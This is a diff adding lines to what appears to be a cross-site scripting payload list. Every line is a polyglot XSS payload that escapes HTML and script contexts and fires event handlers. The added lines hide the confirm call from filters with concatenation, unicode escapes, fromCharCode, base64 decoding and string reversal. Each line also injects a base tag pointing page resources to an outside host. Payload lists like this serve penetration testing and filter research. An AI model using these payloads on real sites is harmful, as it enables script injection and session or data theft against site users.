@@ -1,5 +1,12 @@
 JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//rix4uni.ez.pe-->
 JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//rix4uni.ez.pe-->
+<svg/onload=/*${/*/;{/**/window['c'+'o'+'n'+'f'+'i'+'r'+'m'](1)}//><Base/Href=//rix4uni.ez.pe-->
+<details open ontoggle=/*${/*/;{/**/self['\u0063'+'\u006f'+'\u006e'+'\u0066'+'\u0069'+'\u0072'+'\u006d'](1)}//><Base/Href=//rix4uni.ez.pe-->
+<video><source onerror=/*${/*/;{/**/window[String.fromCharCode(99,111,110,102,105,114,109)](1)}//><Base/Href=//rix4uni.ez.pe-->
+<body onpageshow=/*${/*/;{/**/this['c'+'o'+'n'+'f'+'i'+'r'+'m'](1)}//><Base/Href=//rix4uni.ez.pe-->
+<select onfocus=/*${/*/;{/**/window['\u0063'+'\u006f'+'\u006e'+'\u0066'+'\u0069'+'\u0072'+'\u006d'](1)}//><Base/Href=//rix4uni.ez.pe-->
+<textarea onfocus=/*${/*/;{/**/top[atob('Y29uZmlybQ==')](1)}//><Base/Href=//rix4uni.ez.pe-->
+<input autofocus onfocus=/*${/*/;{/**/parent['mrifnoc'.split('').reverse().join('')](1)}//><Base/Href=//rix4uni.ez.pe-->
 '"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=(confirm)(1)>
 '"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=&#x63;onfir\u006d`1`>
 1'/confirm?.(1)/'
